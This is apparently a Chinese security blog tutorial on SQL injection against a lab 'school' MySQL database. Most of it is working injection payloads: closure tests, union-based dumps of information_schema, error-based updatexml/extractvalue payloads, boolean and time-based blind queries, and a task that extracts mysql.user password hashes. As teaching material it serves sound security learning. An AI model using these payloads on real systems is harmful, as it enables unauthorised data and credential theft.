---
title: "SQL 注入漏洞原理与利用"
permalink: sql-injection-basics/
date: 2025-12-02 01:16:43
categories:
  - 网络安全
  - Web 安全
tags:
  - SQL注入
  - Web安全
  - 数据库
img: /medias/featureimages/0.jpg
summary: "SQL 注入的原理、分类（联合/报错/布尔/时间盲注）、常见注入点与手工利用思路。"
---

<!-- more -->

## 常见Web 漏洞
 OWASP Top 10 2025：

 Web 应用安全十大风险排行榜

[https://owasp.org/Top10/2025/0x00_2025-Introduction/](https://owasp.org/Top10/2025/0x00_2025-Introduction/)

1  **访问控制故障**  ：垂直越权、CORS、未授权访问、SSRF 、Cookie伪造等

2  **安全配置错误**  ： 默认密码、启用或安装了不必要的功能

3  **供应链安全**  ： 过时的操作系统、Web/应用服务器、数据库管理系统 (DBMS)、应用程序、API 及其所有组件、运行时环境和库存在的漏洞

4  **不安全的加密**  ： 没有用https、加密密钥是否已 提交到源代码库中、使用或旧代码中 使用的过时或 弱加密算法或协议、未加密的协议如 FTP

5  **注入** ： SQL注入、RCE、XXE、LDAP注入、JNDI注入、SSTI 等

6  **不安全的设计**  ： 支付逻辑漏洞、抢购、本地时间验证

7  **错误的身份验证**  ：  弱口令，没有多因素身份验证（MFA）、简单的忘记密码等

8  **数据完整性问题**  ： 数字签名缺失

9   **缺失日志和警报**：没有日志记录和监控,攻击和漏洞就无法被察觉,且在安全事件中,若不发出警报,将很难快速有效地响应。日志记录、持续监控、检测和警报不足,无法随时启动主动响应

10  **特殊情况处理不当**  ： 逻辑缺陷、溢出、种族状况、欺诈性交易,或内存、状态、资源、时间、身份验证和授权问题。这类漏洞可能对系统或数据的保密性、可用性和/或完整性产生负面影响

## 具体的常见Web 漏洞
SQL注入、XSS、CSRF、SSRF、文件包含、文件上传、CORS、XXE、弱口令、未授权访问、SSTI、RCE、反序列化、CRLF、越权 等

## 怎么学
```plain
漏洞的产生原因（原理）
危害
怎么去挖掘 （黑盒、白盒）
怎么去利用
怎么修复
怎么绕开常见的 拦截
```

## SQL注入漏洞
### 1 产生原因（是什么）
用户 从前端传入的参数，没有经过后端的严格过滤或处理，直接拼接到了 SQL 语句中，导致SQL注入

### 2 危害
```plain
泄露数据库中的数据
破坏数据库、破坏服务器
控制服务器 （getshell）
```

### 3 挖掘
####   1 代码审计
```plain
定位SQL 语句，看sql 语句中是否有可控变量 （有）
看变量有没有被过滤 （没有）
看变量是否是从前端传过来的 （是）
```

 如1、2、3均满足，则一定具有 SQL 注入漏洞

####   2 漏洞挖掘
方法

```plain
扫描器扫描所用参数
手工测试：测试可能和数据库有交互的参数
```

## 示例
```plain
实现网站的正常功能，比如学生成绩查询，猜测和数据库交互
随意输入一个学号（随意的值）或 输入一个已知的学号（正确的值）
测试SQL注入
```

## 测试闭合方法
### ⭐1  引号测试闭合
```plain
'  单引号报错
"  双引号不报错
```

 说明：可能存在SQL注入漏洞，且闭合可能是单引号 （谁报错，谁是闭合）

⚠  `怎么才能理解SQL注入：把SQL语句单独拿出来，运行即可  `

靶场角度：输入' 报错，输入 "  不报错

### ⭐2  and 测试
首先需要有 **正确** 的值

```plain
 正确得值'  and  1=1#
```

说明：可能存在SQL注入漏洞,  且闭合是单引号 （加不加   '  and 1=1# 网站不会发生变化）

靶场角度：输入 20210101 查询到 Alice 的成绩，输入 20210101'  and 1=1# 也查询到了 Alice 的成绩

### ⭐3  or 测试
没有正确值，可以采用or测试，⚠慎用！！！

```plain
非正确的值' or 1=1#
```

说明：可能存在SQL注入漏洞，且闭合是单引号 （加上 ' or 1=1# 查询出了正确结果）

靶场角度： 输入 -1 ，没有查询到学生成绩，输入  -1'  or 1=1# 查询到学生成绩

### ⭐4  不加注释符闭合测试
 (mysql 的注释符 # 、 --空格 **(双连字符+空格)**)

```plain
正确的值'  and  1='1
非正确的值' or  1='1
```

### ⭐5  sleep 测试
```plain
正确的值'  and  sleep(5)#
```

说明：如果sleep触发，说明存在SQL注入漏洞，且闭合为单引号

⚠️ 一定要慎用下面的or语句，实际sleep 时间是 5x行数

```plain
错误的值'  or  sleep(3)#
```

### ⭐6 order by 测试
```plain
任意的值' order by 999#
```

说明：以表的第999列进行排序，但是一般的表都没有999列，就会报错，说明闭合是单引号

### 4 利用
#### 1  显错注入-联合查询
前置知识：information_schema

**information_schema 信息概要数据库：**

```plain
schemata 表：保存了 mysql 数据库所有的数据库名
tables 表：保存了mysql 数据库的所有的数据库的所有的表信息
columns 表：保存了 mysql 数据库的所有数据库的所有表的所有列信息
```

##### 1  判断查询结果的列数
order by 排序

遍历 （推荐 直接使用 -1）

```plain
-1' order by 1#
-1' order by 2#
-1' order by 3#
```

得到结果：2列

```plain
-1' order by 99#
-1' order by 50#
-1' order by 25#
-1' order by 13#
-1' order by 6#
-1' order by 3#
-1' order by 2#
```

得到结果： 2列

##### 2  判断回显位
 union select 联合查询

```plain
-1' union  select  1,2#
```

##### 3  使用函数获取基础信息
**替换回显位为mysql自带的函数，获取一些数据库信息**

```plain
-1' union select 1,version()#
-1' union select version(),2#
```

```plain
version() 获取 mysql 版本
user() 获取 mysql 当前用户
database() 获取当前的数据库名
@@basedir 获取 mysql 的路径
```

**如果是挖掘src漏洞，到此截止**

##### 4  获取数据
###### 1  数据库名
```plain
-1' union select 1,2#
-1' union select schema_name,2 from information_schema.schemata#
-1' union select 1,schema_name from information_schema.schemata#
```

⚠常见的错误： -1' union select schema_name from information_schema.schemata,2 #

数据库名获取了，但是由于前端可能显示不完整，怎么解决显示问题

解决方法1：使用 group_concat 聚合函数，作用是把多行数据放在一行中显示，并用逗号分隔

```plain
-1' union select group_concat(schema_name),2 from information_schema.schemata#
```

解决方法2：使用limit 语句，作用是指定显示哪一行

```plain
-1' union select schema_name,2 from information_schema.schemata limit 0,1#
-1' union select schema_name,2 from information_schema.schemata limit 1,1#
-1' union select schema_name,2 from information_schema.schemata limit 2,1#
-1' union select schema_name,2 from information_schema.schemata limit 3,1#
-1' union select schema_name,2 from information_schema.schemata limit 4,1#
```

**解释：limit a,b 意思为 从a开始选b行作为结果（不包括a本身）**

**如limit 4,1 ，意思从4行开始选1行结果（不包括4行本身），所以选择的是第5行**

###### 2  表名
一般获取的是当前数据库的表名

```plain
-1' union select table_name,2 from information_schema.tables where table_schema='school'#
```

可以使用聚合函数：

```plain
-1' union select group_concat(table_name),2 from information_schema.tables where
table_schema='school'#
```

也可以使用limit：

```plain
-1' union select table_name,2 from information_schema.tables where table_schema
='school' limit 0,1#
-1' union select table_name,2 from information_schema.tables where table_schema
='school' limit 1,1#
```

school 代表当前数据库名，也可以使用 database() 函数代替

```plain
-1' union select group_concat(table_name),2 from information_schema.tables where
table_schema=database()#
```

school 代表当前数据库名，也可以使用 hex 值代替

[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

```plain
-1' union select group_concat(table_name),2 from information_schema.tables where
table_schema=0x7363686f6f6c#
```

###### 3  列名
```plain
-1' union select group_concat(column_name),2 from information_schema.columns where
table_schema='school' and table_name='students'#
```

解释：table_schema= 数据库名 table_name=表名

```plain
-1' union select group_concat(column_name),2 from information_schema.columns where
table_schema='school' and table_name='flag'#
```

数据库名和表名可以替换为hex值，如 students = 73747564656e7473

```plain
-1' union select group_concat(column_name),2 from information_schema.columns where
table_schema=0x7363686f6f6c and table_name=0x73747564656e7473#
```

###### 4  获取具体数据
使用之前的步骤，获取到的 数据库名、表名、列名，读取对应的数据

```plain
-1' union select group_concat(name),group_concat(score) from school.students#
```

```plain
-1' union select group_concat(name,score),2 from school.students#
```

可以自定义分隔符，美化输出

```plain
-1' union select group_concat(id,':',student_id,':',name,':',score),2 from
school.students#
```

可以查询其他表的数据，查询 school 数据库 flag 表 flag 列的数据

```plain
-1' union select group_concat(flag),2 from school.flag#
```

### 练习任务：获取 mysql root用户的密码hash
 哪里？：mysql 数据库 user 表 authentication_string 列

```plain
-1' union select group_concat(host,':',user,':',authentication_string),2 from
mysql.user#
```

```plain
-1' union select authentication_string,2 from  mysql.user#
```

#### 2  显错注入-报错注入
##### 如何判断是报错注入
联合查询的 2  判断回显位 发现没有回显位，可以采用报错注入

#####  报错注入函数 updatexml
###### updatexml 作用
返回替换后的 XML 片段，如果updatexml报错，会返回xpath错误信息，顺便带出数据

[https://dev.mysql.com/doc/refman/8.4/en/xml-functions.html](https://dev.mysql.com/doc/refman/8.4/en/xml-functions.html)

###### 使用方法
```plain
updatexml(1, concat(0x7e, (SQL语句), 0x7e), 1)
```

```plain
1' and updatexml(1, concat(0x7e, (select version()), 0x7e), 1)#
1' and updatexml(1, concat(0x7b, (select version()), 0x7d), 1)#
```

解释：执行的SQL语句是 select version(), 0x7e 是 ～ 的 ASCII字符，可以换成其他比如 0x7b { 和 0x7d }

###### 获取基础信息
```plain
1' and updatexml(1, concat(0x7e, (select user()), 0x7e), 1)#
```

###### 获取数据库名
```plain
1' and updatexml(1, concat(0x7e, (select group_concat(schema_name) from
information_schema.schemata), 0x7e), 1)#
```

 ⚠️ xmlupdate 函数输出的 xpath 报错最多只能输出 32个字符，可以使用 limit 解决

`1' and updatexml(1, concat(0x7e, (select schema_name from information_schema.schemata limit 0,1), 0x7e), 1)#  `

`1' and updatexml(1, concat(0x7e, (select schema_name from information_schema.schemata limit 1,1), 0x7e), 1)#  `

`1' and updatexml(1, concat(0x7e, (select schema_name from information_schema.schemata limit 2,1), 0x7e), 1)#  `

`1' and updatexml(1, concat(0x7e, (select schema_name from information_schema.schemata limit 3,1), 0x7e), 1)#  `

`1' and updatexml(1, concat(0x7e, (select schema_name from information_schema.schemata limit 4,1), 0x7e), 1)#  `

 `1' and updatexml(1, concat(0x7e, (select schema_name from information_schema.schemata limit 5,1), 0x7e), 1)#  `

###### 获取表
`1' and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema='school' limit 0,1), 0x7e), 1)#  `

`1' and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema='school' limit 2,1), 0x7e), 1)#  `

###### 获取列
`1' and updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema='school' and table_name='flag' limit 0,1), 0x7e), 1)#  `

###### 获取具体数据
```plain
1' and updatexml(1, concat(0x7e, (select flag from school.flag limit 0,1),0x7e), 1)#
```

⚠️ ：数据可能会超过 32 个字符，无法显示，可以用 substring 解决 （分割字符串）

```plain
substring('hello123', 2,3);
解释：从第2个字符开始，取3个字符（包括第2个字符自身）
结果：ell
```

```plain
1' and updatexml(1, concat(0x7e, (select substring(flag,1,30) from
school.flag limit 0,1), 0x7e), 1)#
1' and updatexml(1, concat(0x7e, (select substring(flag,31,20) from
school.flag limit 0,1), 0x7e), 1)#
1' and updatexml(1, concat(0x7e, (select substring(flag,a,b) from
school.flag limit 0,1), 0x7e), 1)#
```

##### 报错注入函数 ExtractValue
###### ExtractValue 作用
[https://dev.mysql.com/doc/refman/8.4/en/xml-functions.html#function_extractvalue](https://dev.mysql.com/doc/refman/8.4/en/xml-functions.html#function_extractvalue)

###### 使用方法
```plain
updatexml:
1' and updatexml(1, concat(0x7e, (select user()), 0x7e), 1)#
extractvalue:
1' and extractvalue(1, concat(0x7e, (select user()), 0x7e))#
```

##### 其他报错注入函数
+  floor 向下取整 (dvwa 老版本可以用)

`1' and (select 1 from (select count(*), concat((SELECT version()), floor(rand(0)*2))x from information_schema.tables group by x)a)#  `

+  ST_LatFromGeoHash 几何和json函数

`1' and ST_LatFromGeoHash(concat(0x7e, (SELECT database()), 0x7e))#  `

+  ST_LongFromGeoHash

 `1' and ST_LongFromGeoHash(concat(0x7e, (SELECT database()), 0x7e))#  `

+  GTID_SUBSET

`1' and GTID_SUBSET((SELECT database()), 1)#  `

#### 3  盲注-布尔盲注
##### 如何判断是布尔盲注
判断闭合时就能发现是布尔盲注 (既没有回显位、也没有报错信息)

+ 使用方法1，引号测试闭合时，不再显示mysql 的报错信息
+ 使用方法6，order by测试闭合时，不再显示mysql 的报错信息

盲注测闭合：

```plain
20210101
20210101' and 1=1#
20210101' and 1='1
20210101' and sleep(5)#

慎用
-1' or 1=1#
-1' or sleep(5)#
```

##### 布尔盲注利用
###### 常见函数
+  substring
+  length 字符串长度

```plain
length('123')   结果：3
```

+  left 从左取几个字符

```plain
left('hello',3)  结果：hel
```

###### 猜当前数据库的长度
原理：通过网站回显的不同判断是否为真，数据库的长度 = 1 网站显示查询失败，说明数据库的长度≠1；数据库的长度 > 1 网站显示查询成功，说明 数据库的长度 > 1

```plain
20210101' and length(database()) > 1# 成功
20210101' and length(database()) = 1# 失败
20210101' and length(database()) < 6# 失败
20210101' and length(database()) = 6# 成功
说明：当前数据库长度是 6 个字符
```

###### 猜当前数据库的字符
```plain
20210101' and left(database(),1) = 'a'# 失败
20210101' and left(database(),1) > 'a'# 成功
20210101' and left(database(),1) = 'b'# 失败
20210101' and left(database(),1) = 'c'# 失败
20210101' and left(database(),1) = 'd'# 失败
.....
20210101' and left(database(),1) = 's'# 成功
说明：当前数据库的第一个字符是 s
```

```plain
20210101' and left(database(),2) = 'sa'# 失败
20210101' and left(database(),2) = 'sb'# 失败
20210101' and left(database(),2) = 'sc'# 成功
说明：当前数据库的前两个字符是 sc
```

```plain
20210101' and left(database(),3) = 'sca'# 失败
20210101' and left(database(),3) = 'scb'# 失败
20210101' and left(database(),3) = 'scc'# 失败
20210101' and left(database(),3) = 'scd'# 失败
20210101' and left(database(),3) = 'sce'# 失败
.....
20210101' and left(database(),3) = 'sch'# 成功
说明：当前数据库的前三个字符是 sch
```

一直到：`20210101'  and  left(database(),6)  =  'school'#` 成功

说明：当前数据库的字符是 school

```plain
用 substring 也能猜
20210101' and substring(database(),1,2) = 'sc'# 成功
20210101' and substring(database(),1,3) = 'sch'# 成功
20210101' and substring(database(),1,6) = 'school'# 成功
```

###### 猜数据库版本
mysql 大版本只有 4、5、8、9

```plain
20210101' and left(version(),1) = 5# 成功
20210101' and left(version(),1) = 8#
20210101' and left(version(),3) = 5.7# 成功
```

###### 猜数据库用户
只要猜是不是root，如果不是root，是其他的用户，具体是什么不用关心

```plain
20210101' and left(user(),4) = 'root'#
```

###### 猜测数据库的名
猜mysql 中有几个数据库

```plain
20210101' and (select count(schema_name) from information_schema.schemata)=5# 成功
mysql 中有 5个数据库
```

猜测具体的数据库名

```plain
20210101' and substring((select schema_name from information_schema.schemata limit 0,1),1,1) = 'i'# 成功
 mysql 第一个数据库的名字的第一个字符是 i
```

```plain
20210101' and left((select schema_name from information_schema.schemata limit 0,1),2) = 'in'# 成功
mysql 第一个数据库的名字的第1，2个字符是 in
```

一直到

```plain
20210101' and (select schema_name from information_schema.schemata limit 0,1) = 'information_schema'# 成功
mysql 第一个数据库的名字是 information_schema
```

###### 猜数据库表
```plain
20210101' and (select count(table_name) from information_schema.tables where table_schema='school') = 2 # 成功
20210101' and (select count(table_name) from information_schema.tables where table_schema='school') > 3 # 失败
school 数据库有2个表
```

```plain
20210101' and substring((select table_name from information_schema.tables where table_schema='school' limit 0,1),1,1) = 'f' # 成功
school 数据库的第一个表的第一个字符是 f
```

```plain
20210101' and (select table_name from information_schema.tables where
table_schema='school' limit 1,1) = 'students' # 成功
school 数据库的第2个表是 students
```

######  猜数据库表的列
```plain
20210101' and substring((select column_name from information_schema.columns
where table_schema='school' and table_name='flag' limit 0,1),1,1) = 'f'# 成功
school 数据库的 flag 表的 第一列的第一个字符 是 f
```

######  猜具体数据
```plain
20210101' and left((select flag from school.flag limit 0,1),5) = 'flag{' # 成功
school 数据库的 flag 表的 flag 列第一行数据的前5个字符是 flag{
```

```plain
20210101' and substring((select column_name from information_schema.columns
where table_schema='mysql' and table_name='user' limit 3,1),5,1) = 'a'#
判断 mysql 数据库的 user 表的第 4 列的 第 5 个字符 是否是 a
```

#### 4  盲注-时间盲注
##### 如何判断是时间盲注
```plain
查询结果没有回显位
看不到 mysql 报错信息
网站在查询成功和查询失败的情况下，显示完全一样
```

##### 时间盲注判断闭合 - sleep
```plain
20210101' and sleep(5)#
存在sql注入漏洞，且闭合是 单引号
```

#####  时间盲注使用
```plain
if((布尔盲注的条件表达式), sleep(5), null)
布尔盲注的条件表达式为真，则 sleep(5);布尔盲注的条件表达式为假，则无操作
```

#####  写时间盲注的exp (攻击)
###### 1 格式
```plain
if((布尔盲注的条件表达式), sleep(5), null)
```

###### 2  布尔盲注的表达式直接复制过来
```plain
if((length(database()) = 1),sleep(5),null)
```

###### 3  拼接为 sql 注入语句
```plain
20210101' and if((length(database()) = 1),sleep(5),null)#
```

#####  猜当前数据库的长度
```plain
20210101' and if((length(database()) > 1),sleep(5),null)#
sleep (5) 触发了，当前数据库的长度大于 1
```

猜数据库版本

```plain
20210101' and if((left(version(),1) = 5),sleep(5),null)#
sleep (5) 触发了,当前数据库的版本是5
```

###### 猜数据库表
```plain
20210101' and if(((select count(table_name) from information_schema.tables where
table_schema='school') > 1),sleep(5),null)#
sleep 5 触发了， school 数据库的 表的个数 大于 1
```

###### 猜具体数据
```plain
20210101' and if((left((select flag from school.flag limit 0,1),5) ='abcde'),sleep(5),null)#
sleep 5 没有触发,说明school数据库的flag表的flag列的第一行数据的前5个字符不是 abcde
20210101' and if((left((select flag from school.flag limit 0,1),5) ='flag{'),sleep(5),null)#
 sleep 5 触发了，说明school数据库的flag表的flag列的第一行数据的前5个字符是 flag{
```
